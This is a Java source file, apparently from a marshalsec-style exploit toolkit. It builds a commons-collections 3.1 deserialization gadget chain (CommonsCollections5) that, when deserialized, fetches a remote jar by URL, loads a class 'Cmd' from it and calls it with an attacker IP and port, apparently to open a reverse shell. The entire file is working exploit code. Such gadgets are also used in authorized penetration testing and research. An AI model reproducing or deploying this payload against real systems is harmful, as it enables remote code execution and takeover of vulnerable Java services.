package marshalsec.gadgets;

import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;
import javax.management.BadAttributeValueExpException;
import marshalsec.UtilFactory;
import marshalsec.util.Reflections;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

/**
 * commons-collections:commons-collections:3.1
 */
public interface CommonsCollections5ForLoadJar extends
    Gadget {
    default BadAttributeValueExpException makeCommonsCollections5ForLoadJar(UtilFactory uf, String[] args) throws Exception {
        // http://127.0.0.1:8080/R.jar 127.0.0.1 4444
        String payloadUrl = args[0];

        String ip2 = args[1];
        Integer port2 = Integer.parseInt(args[2]);
        // inert chain for setup
        final Transformer transformerChain = new ChainedTransformer(
            new Transformer[] { new ConstantTransformer(1) });
        // real chain for after setup
        final Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(java.net.URLClassLoader.class),
            // getConstructor class.class classname
            new InvokerTransformer("getConstructor",
                new Class[] { Class[].class },
                new Object[] { new Class[] { java.net.URL[].class } }),
            new InvokerTransformer(
                "newInstance",
                new Class[] { Object[].class },
                new Object[] { new Object[] { new java.net.URL[] { new java.net.URL(
                    payloadUrl) } } }),
            // loadClass String.class R
            new InvokerTransformer("loadClass",
                new Class[] { String.class }, new Object[] { "Cmd" }),
            // set the target reverse ip and port
            new InvokerTransformer("getConstructor",
                new Class[] { Class[].class },
                new Object[] { new Class[] { String.class,int.class } }),
            // invoke
            new InvokerTransformer("newInstance",
                new Class[] { Object[].class },
                new Object[] { new Object[] { ip2,port2 } }),
            new ConstantTransformer(1) };
        final Map innerMap = new HashMap();
        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        Field valfield = val.getClass().getDeclaredField("val");
        valfield.setAccessible(true);
        valfield.set(val, entry);

        Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain
        return val;
    }
}
